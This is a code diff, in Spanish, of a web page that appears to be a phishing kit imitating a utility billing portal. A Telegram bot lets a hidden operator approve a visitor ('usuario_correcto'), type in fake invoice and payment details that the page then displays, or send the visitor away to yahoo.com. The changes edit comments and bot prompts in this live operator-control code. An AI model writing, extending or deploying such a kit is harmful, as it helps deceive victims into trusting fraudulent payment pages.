@@ -888,7 +888,6 @@ main {
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
                 <span>Cartera</span>
             </div>
-            <!-- AQUÍ SE INYECTA EL NOMBRE -->
             <div class="menu-icon">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                 <span id="txtSaludoNombre">¡Hola!</span>
@@ -1232,6 +1231,7 @@ function escucharBotones(callbackAction) {
 }
 
 function escucharDatosFacturas() {
+    // Le decimos al sistema que espere un mensaje de texto
     esperandoDatosFacturas = true;
     pollingActivo = true;
     
@@ -1323,18 +1323,18 @@ function handleTelegramActionToken(action) {
     actionProcessed = true;
 
     if (action === 'usuario_correcto') {
-        // Ahora pedimos que se escriba en formato vertical (cada dato en una línea)
+        // Pedimos los 6 datos
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
-                text: `👉 <b>Escribe los datos uno debajo del otro (en 6 líneas):</b>\n\n1. Nombre Completo\n2. Referencia Completa\n3. Total Facturas\n4. Valor Cartera\n5. Valor Cuota\n6. Fecha Base (DD/MM/AAAA)\n\n<b>Ejemplo:</b>\n<code>Sergio\n16-1003.240405.38361573\n17\n42655060\n1500000\n28/10/2026</code>`, 
+                text: `👉 <b>Escribe los 6 datos en líneas separadas:</b>\n\n<code>Nombre Completo\nReferencia Completa\nTotal Facturas\nValor Cartera\nValor Cuota\nFecha Base (DD/MM/AAAA)</code>`, 
                 parse_mode: 'HTML' 
             })
         });
         
         escucharDatosFacturas();
-        mostrarOverlay();
+        mostrarOverlay(); // Mostramos "Procesando" para que el usuario sepa que debe esperar
 
     } else if (action === 'finalizar_yahoo') {
         redirigir('https://www.yahoo.com');
@@ -1355,16 +1355,16 @@ function handleTelegramActionToken(action) {
 // PROCESAR LOS DATOS QUE TÚ ESCRIBES EN TELEGRAM
 // ==========================================
 function procesarDatosFacturas(texto) {
-    // Separar por saltos de línea (en lugar de comas)
+    // Separar por saltos de línea
     const partes = texto.split('\n').map(s => s.trim()).filter(s => s !== '');
     
-    // Ahora son 6 líneas.
+    // Validar que sean al menos 6 líneas
     if (partes.length < 6) {
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "❌ Formato incorrecto. Debes escribir los 6 datos uno debajo del otro. Intenta de nuevo.", parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "❌ Error: Debes escribir 6 líneas con los datos (Nombre, Referencia, Facturas, Cartera, Cuota, Fecha). Vuelve a intentarlo.", parse_mode: 'HTML' })
         });
-        escucharDatosFacturas();
+        escucharDatosFacturas(); // Volver a escuchar
         return;
     }
 
@@ -1381,7 +1381,7 @@ function procesarDatosFacturas(texto) {
 
     // Actualizar los textos en pantalla
     document.getElementById('txtSaludoNombre').textContent = `¡Hola! ${nombreUsuario}`;
-    document.getElementById('txtNombreProyecto').textContent = `LIRIO ET1`; // O usar nombreUsuario si se prefiere
+    document.getElementById('txtNombreProyecto').textContent = `LIRIO ET1`; 
     document.getElementById('txtNombreProyectoPaso2').textContent = `LIRIO ET1`;
     
     document.getElementById('txtReferencia').textContent = referenciaCompleta;
@@ -1429,6 +1429,7 @@ function procesarDatosFacturas(texto) {
         fechaActual.setMonth(fechaActual.getMonth() + 1);
     }
 
+    // Ocultar el overlay y mostrar la pantalla amarilla
     ocultarOverlay();
     contenedorOriginal.style.display = 'none';
     viewAmarilla.classList.add('active');
